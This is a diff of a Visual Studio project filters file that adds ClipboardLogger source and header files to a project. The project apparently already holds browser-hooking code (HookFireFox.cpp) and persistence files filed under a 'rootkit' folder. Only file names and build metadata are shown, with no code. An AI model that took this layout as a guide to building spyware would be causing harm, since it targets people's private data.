@@ -48,6 +48,9 @@
     <ClInclude Include="persistence.h">
       <Filter>標頭檔\rootkit</Filter>
     </ClInclude>
+    <ClInclude Include="ClipboardLogger.h">
+      <Filter>標頭檔</Filter>
+    </ClInclude>
   </ItemGroup>
   <ItemGroup>
     <ClCompile Include="HookFireFox.cpp">
@@ -67,6 +70,9 @@
     </ClCompile>
     <ClCompile Include="persistence.cpp">
       <Filter>來源檔案\rootkit</Filter>
+    </ClCompile>
+    <ClCompile Include="ClipboardLogger.cpp">
+      <Filter>來源檔案</Filter>
     </ClCompile>
   </ItemGroup>
 </Project>
